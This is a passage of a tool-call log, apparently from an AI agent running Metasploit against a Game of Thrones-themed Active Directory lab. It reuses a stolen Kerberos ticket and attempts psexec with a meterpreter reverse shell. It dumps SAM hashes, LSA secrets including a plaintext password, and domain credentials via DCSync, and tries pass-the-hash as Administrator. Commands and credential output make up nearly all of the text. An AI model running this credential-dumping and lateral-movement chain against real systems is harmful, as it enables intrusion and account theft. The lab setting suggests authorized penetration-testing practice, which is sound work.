[+] 10.50.0.11:88 - Received a valid TGS-Response
[*] 10.50.0.11:88 - TGS MIT Credential Cache ticket saved to /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin
[*] Auxiliary module execution completed

```

---

#### ✅ msf_console_execute
*2025-12-17 12:28:42* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"use exploit/windows/smb/psexec"}
```

**Output:**
```
[*] Using configured payload windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST

```

---

#### ✅ msf_console_execute
*2025-12-17 12:28:47* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"set RHOSTS 10.50.0.11"}
```

**Output:**
```
RHOSTS => 10.50.0.11

```

---

#### ✅ msf_console_execute
*2025-12-17 12:28:52* | Target: `1` | Duration: 507ms

**Input:**
```json
{"id":"1","command":"set SMB::Auth kerberos"}
```

**Output:**
```
SMB::Auth => kerberos

```

---

#### ✅ msf_console_execute
*2025-12-17 12:28:59* | Target: `1` | Duration: 519ms

**Input:**
```json
{"id":"1","command":"set SMB::Krb5Ccname /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin"}
```

**Output:**
```
SMB::Krb5Ccname => /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin

```

---

#### ✅ msf_console_execute
*2025-12-17 12:29:03* | Target: `1` | Duration: 507ms

**Input:**
```json
{"id":"1","command":"set SMBDomain NORTH.SEVENKINGDOMS.LOCAL"}
```

**Output:**
```
SMBDomain => NORTH.SEVENKINGDOMS.LOCAL

```

---

#### ✅ msf_console_execute
*2025-12-17 12:29:09* | Target: `1` | Duration: 507ms

**Input:**
```json
{"id":"1","command":"set SMBUser eddard.stark"}
```

**Output:**
```
SMBUser => eddard.stark

```

---

#### ✅ msf_console_execute
*2025-12-17 12:29:13* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"set SMB::Rhostname winterfell.north.sevenkingdoms.local"}
```

**Output:**
```
SMB::Rhostname => winterfell.north.sevenkingdoms.local

```

---

#### ✅ msf_console_execute
*2025-12-17 12:29:18* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"set LHOST 10.50.0.1"}
```

**Output:**
```
LHOST => 10.50.0.1

```

---

#### ✅ msf_console_execute
*2025-12-17 12:29:23* | Target: `1` | Duration: 507ms

**Input:**
```json
{"id":"1","command":"set LPORT 4454"}
```

**Output:**
```
LPORT => 4454

```

---

#### ❌ msf_console_execute
*2025-12-17 12:29:29* | Target: `1` | Duration: 18527ms

**Input:**
```json
{"id":"1","command":"run"}
```

**Output:**
```
[*] Started reverse TCP handler on 10.50.0.1:4454 
[*] 10.50.0.11:445 - Connecting to the server...
[*] 10.50.0.11:445 - Authenticating to 10.50.0.11:445|NORTH.SEVENKINGDOMS.LOCAL as user 'eddard.stark'...
[*] 10.50.0.11:445 - Patching sname from CIFS/winterfell.north.sevenkingdoms.local to cifs/winterfell.north.sevenkingdoms.local
[*] 10.50.0.11:445 - Loaded a credential from ticket file: /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin
[*] 10.50.0.11:445 - Selecting PowerShell target
[*] 10.50.0.11:445 - Executing the payload...
[-] 10.50.0.11:445 - Service failed to start - ACCESS_DENIED
[*] Exploit completed, but no session was created.

```

---

#### ✅ msf_console_execute
*2025-12-17 12:29:56* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"use auxiliary/scanner/smb/impacket/wmiexec"}
```

**Output:**
```
(no output)
```

---

#### ✅ msf_console_execute
*2025-12-17 12:30:09* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"use exploit/windows/smb/psexec"}
```

**Output:**
```
[*] Using configured payload windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST

```

---

#### ✅ msf_console_execute
*2025-12-17 12:30:13* | Target: `1` | Duration: 506ms

**Input:**
```json
{"id":"1","command":"show options"}
```

**Output:**
```

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal rea
                                                    d/write folder share


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name       Current Setting            Required  Description
   ----       ---------------            --------  -----------
   RHOSTS     10.50.0.11                 no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                                   s/using-metasploit.html
   RPORT      445                        no        The target port (TCP)
   SMBDomain  NORTH.SEVENKINGDOMS.LOCAL  no        The Windows domain to use for authentication
   SMBPass    powerkingftw135            no        The password for the specified username
   SMBUser    eddard.stark               no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.50.0.1        yes       The listen address (an interface may be specified)
   LPORT     4454             yes       The listen port


Expl
... (truncated)
```

---

### Phase: enumeration

#### ✅ msf_module_search
*2025-12-17 12:30:19* | Duration: 39ms

**Input:**
```json
{"query":"atexec scheduled task"}
```

**Output:**
```
No modules found matching query.
```

---

#### ✅ msf_module_search
*2025-12-17 12:30:27* | Duration: 79ms

**Input:**
```json
{"query":"impacket smbexec"}
```

**Output:**
```
No modules found matching query.
```

---

#### ✅ msf_module_search
*2025-12-17 12:30:32* | Duration: 99ms

**Input:**
```json
{"query":"secretsdump"}
```

**Output:**
```
[
  {
    "type": "auxiliary",
    "name": "auxiliary/gather/windows_secrets_dump",
    "rank": "normal"
  },
  {
    "type": "auxiliary",
    "name": "auxiliary/scanner/smb/impacket/secretsdump",
    "rank": "normal"
  },
  {
    "type": "post",
    "name": "post/windows/gather/credentials/windows_sam_hivenightmare",
    "rank": "normal"
  }
]
```

---

### Phase: post_exploitation

#### ✅ msf_console_execute
*2025-12-17 12:30:37* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"use auxiliary/gather/windows_secrets_dump"}
```

**Output:**
```
[*] Setting default action ALL - view all 5 actions with the show actions command
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST

```

---

#### ✅ msf_console_execute
*2025-12-17 12:30:46* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"set RHOSTS 10.50.0.11"}
```

**Output:**
```
RHOSTS => 10.50.0.11

```

---

#### ✅ msf_console_execute
*2025-12-17 12:30:52* | Target: `1` | Duration: 513ms

**Input:**
```json
{"id":"1","command":"set SMB::Auth kerberos"}
```

**Output:**
```
SMB::Auth => kerberos

```

---

#### ✅ msf_console_execute
*2025-12-17 12:30:57* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":"1","command":"set SMB::Krb5Ccname /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin"}
```

**Output:**
```
SMB::Krb5Ccname => /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin

```

---

#### ✅ msf_console_execute
*2025-12-17 12:31:03* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"set SMBDomain NORTH.SEVENKINGDOMS.LOCAL"}
```

**Output:**
```
SMBDomain => NORTH.SEVENKINGDOMS.LOCAL

```

---

#### ✅ msf_console_execute
*2025-12-17 12:31:08* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"set SMBUser eddard.stark"}
```

**Output:**
```
SMBUser => eddard.stark

```

---

#### ✅ msf_console_execute
*2025-12-17 12:31:13* | Target: `1` | Duration: 507ms

**Input:**
```json
{"id":"1","command":"set SMB::Rhostname winterfell.north.sevenkingdoms.local"}
```

**Output:**
```
SMB::Rhostname => winterfell.north.sevenkingdoms.local

```

---

#### ✅ msf_console_execute
*2025-12-17 12:31:24* | Target: `1` | Duration: 9624ms

**Input:**
```json
{"id":"1","command":"run"}
```

**Output:**
```
[*] Running module against 10.50.0.11
[*] 10.50.0.11:445 - Patching sname from CIFS/winterfell.north.sevenkingdoms.local to cifs/winterfell.north.sevenkingdoms.local
[*] 10.50.0.11:445 - Loaded a credential from ticket file: /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin
[*] 10.50.0.11:445 - Service RemoteRegistry is in stopped state
[*] 10.50.0.11:445 - Starting service...
[*] 10.50.0.11:445 - Retrieving target system bootKey
[+] 10.50.0.11:445 - bootKey: 0xcbef59fc117225a6ada5e68f103b0cd0
[*] 10.50.0.11:445 - Using `INLINE` technique for SAM
[*] 10.50.0.11:445 - Dumping SAM hashes
[*] 10.50.0.11:445 - Password hints:
No users with password hints on this system
[*] 10.50.0.11:445 - Password hashes (pwdump format - uid:rid:lmhash:nthash:::):
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] 10.50.0.11:445 - Using `INLINE` technique for CACHE and LSA
[*] 10.50.0.11:445 - Decrypting LSA Key
[*] 10.50.0.11:445 - Dumping LSA Secrets
$MACHINE.ACC
NORTH\WINTERFELL$:plain_password_hex:a80ed5bfbff2ac3e214ede1e326904d30a949bba6c9332c04ed550736054ce7d19fb23e9a9bbdebbef7faf4c4520e4c6dc85845a6480d7ce9db7bf8e65b527f14777064d3bce00df1948db78158765da0eac60313028b7d40aae24dd32c96b0856911840842922d1ca308a7f30774f9b97ed6faaa4d07a84c3e578cd7f8e53d1f292c8220601041d7312dd75fd51509c00a7bf79f7dd672adf0af2d93bce1ebe9c6873ed1f5ade6bfe3fce77095ef987571d69e1daecb079a02fc09d1010e1926ac5207e558251df4ed30d5ccb93911649b047fe2f3ac9c822d480ca6d0e77cd4d0af6e2c433416f3dfff504aff1cf22
NORTH\WINTERFELL$:aad3b435b51404eeaad3b435b51404ee:63b06bc824052112adbb298f3bf0151e:::

DefaultPassword
NORTH\robb.stark: sexywolfy

DPAPI_SYSTEM
dpapi_machinekey: 0xa424165f29fa6b82b56846
... (truncated)
```

---

#### ✅ msf_console_execute
*2025-12-17 12:31:57* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":"1","command":"use exploit/windows/smb/psexec"}
```

**Output:**
```
[*] Using configured payload windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST

```

---

#### ✅ msf_console_execute
*2025-12-17 12:32:01* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"set RHOSTS 10.50.0.11"}
```

**Output:**
```
RHOSTS => 10.50.0.11

```

---

#### ✅ msf_console_execute
*2025-12-17 12:32:06* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"set SMBUser Administrator"}
```

**Output:**
```
SMBUser => Administrator

```

---

#### ✅ msf_console_execute
*2025-12-17 12:32:14* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"set SMBPass aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4"}
```

**Output:**
```
SMBPass => aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4

```

---

#### ✅ msf_console_execute
*2025-12-17 12:32:19* | Target: `1` | Duration: 506ms

**Input:**
```json
{"id":"1","command":"set SMBDomain ."}
```

**Output:**
```
SMBDomain => .

```

---

#### ✅ msf_console_execute
*2025-12-17 12:32:24* | Target: `1` | Duration: 507ms

**Input:**
```json
{"id":"1","command":"unset SMB::Auth"}
```

**Output:**
```
Unsetting SMB::Auth...
[!] Variable "SMB::Auth" unset - but will use a default value still. If this is not desired, set it to a new value or attempt to clear it with set --clear SMB::Auth

```

---

#### ✅ msf_console_execute
*2025-12-17 12:32:29* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"set SMB::Auth ntlm"}
```

**Output:**
```
SMB::Auth => ntlm

```

---

#### ✅ msf_console_execute
*2025-12-17 12:32:34* | Target: `1` | Duration: 507ms

**Input:**
```json
{"id":"1","command":"set LHOST 10.50.0.1"}
```

**Output:**
```
LHOST => 10.50.0.1

```

---

#### ✅ msf_console_execute
*2025-12-17 12:32:38* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"set LPORT 4455"}
```

**Output:**
```
LPORT => 4455

```

---

#### ❌ msf_console_execute
*2025-12-17 12:32:43* | Target: `1` | Duration: 18438ms

**Input:**
```json
{"id":"1","command":"run"}
```

**Output:**
```
[*] Started reverse TCP handler on 10.50.0.1:4455 
[*] 10.50.0.11:445 - Connecting to the server...
[*] 10.50.0.11:445 - Authenticating to 10.50.0.11:445 as user 'Administrator'...
[*] 10.50.0.11:445 - Selecting PowerShell target
[*] 10.50.0.11:445 - Executing the payload...
[-] 10.50.0.11:445 - Service failed to start - ACCESS_DENIED
[*] Exploit completed, but no session was created.

```

---

#### ✅ msf_console_execute
*2025-12-17 12:33:09* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":"1","command":"use auxiliary/gather/windows_secrets_dump"}
```

**Output:**
```
[*] Setting default action ALL - view all 5 actions with the show actions command
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST

```

---

#### ✅ msf_console_execute
*2025-12-17 12:33:14* | Target: `1` | Duration: 506ms

**Input:**
```json
{"id":"1","command":"set RHOSTS 10.50.0.11"}
```

**Output:**
```
RHOSTS => 10.50.0.11

```

---

#### ✅ msf_console_execute
*2025-12-17 12:33:19* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"set SMB::Auth kerberos"}
```

**Output:**
```
SMB::Auth => kerberos

```

---

#### ✅ msf_console_execute
*2025-12-17 12:33:26* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"set SMB::Krb5Ccname /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin"}
```

**Output:**
```
SMB::Krb5Ccname => /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin

```

---

#### ✅ msf_console_execute
*2025-12-17 12:33:32* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"set SMBDomain NORTH.SEVENKINGDOMS.LOCAL"}
```

**Output:**
```
SMBDomain => NORTH.SEVENKINGDOMS.LOCAL

```

---

#### ✅ msf_console_execute
*2025-12-17 12:33:36* | Target: `1` | Duration: 507ms

**Input:**
```json
{"id":"1","command":"set SMBUser eddard.stark"}
```

**Output:**
```
SMBUser => eddard.stark

```

---

#### ✅ msf_console_execute
*2025-12-17 12:33:41* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":"1","command":"set SMB::Rhostname winterfell.north.sevenkingdoms.local"}
```

**Output:**
```
SMB::Rhostname => winterfell.north.sevenkingdoms.local

```

---

#### ✅ msf_console_execute
*2025-12-17 12:33:45* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":"1","command":"set DomainControllerRhost 10.50.0.11"}
```

**Output:**
```
DomainControllerRhost => 10.50.0.11

```

---

#### ✅ msf_console_execute
*2025-12-17 12:33:56* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":"1","command":"set ACTION DOMAIN"}
```

**Output:**
```
ACTION => DOMAIN

```

---

#### ✅ msf_console_execute
*2025-12-17 12:34:01* | Target: `1` | Duration: 5114ms

**Input:**
```json
{"id":"1","command":"run"}
```

**Output:**
```
[*] Running module against 10.50.0.11
[*] 10.50.0.11:445 - Patching sname from CIFS/winterfell.north.sevenkingdoms.local to cifs/winterfell.north.sevenkingdoms.local
[*] 10.50.0.11:445 - Loaded a credential from ticket file: /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin
[*] 10.50.0.11:445 - Service RemoteRegistry is already running
[*] 10.50.0.11:445 - Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] 10.50.0.11:445 - Using the DRSUAPI method to get NTDS.DIT secrets
[*] 10.50.0.11:445 - SID enumeration progress -  0 / 19 ( 0.00%)
[*] 10.50.0.11:445 - SID enumeration progress - 19 / 19 (  100%)
[*] 10.50.0.11:445 - Patching sname from CIFS/winterfell.north.sevenkingdoms.local to ldap/winterfell.north.sevenkingdoms.local
[*] 10.50.0.11:445 - Loaded a credential from ticket file: /home/tuomo/.msf4/loot/20251217122836_default_10.50.0.11_mit.kerberos.cca_280012.bin
# SID's:
Administrator: S-1-5-21-2825620776-1928720347-1758113318-500
Guest: S-1-5-21-2825620776-1928720347-1758113318-501
krbtgt: S-1-5-21-2825620776-1928720347-1758113318-502
vagrant: S-1-5-21-2825620776-1928720347-1758113318-1000
arya.stark: S-1-5-21-2825620776-1928720347-1758113318-1110
eddard.stark: S-1-5-21-2825620776-1928720347-1758113318-1111
catelyn.stark: S-1-5-21-2825620776-1928720347-1758113318-1112
robb.stark: S-1-5-21-2825620776-1928720347-1758113318-1113
sansa.stark: S-1-5-21-2825620776-1928720347-1758113318-1114
brandon.stark: S-1-5-21-2825620776-1928720347-1758113318-1115
rickon.stark: S-1-5-21-2825620776-1928720347-1758113318-1116
hodor: S-1-5-21-2825620776-1928720347-1758113318-1117
jon.snow: S-1-5-21-2825620776-1928720347-1758113318-1118
samwell.tarly: S-1-5-21-2825620776-1928720347-1758113318-1119
jeor.mormont: S-1-5-21-2825620776-1928720347-1758113318-1120
sql_svc: S-1-5-21-2825620776-1928720347-1758113318-1121
WINTERFELL$: S-1-5-21-2825620776-1928720347-1758113318-1001
CASTELBLACK$: S-1-5-21-2825620776-1928720347-1758113318-1105
SEVENKIN
... (truncated)
```

---

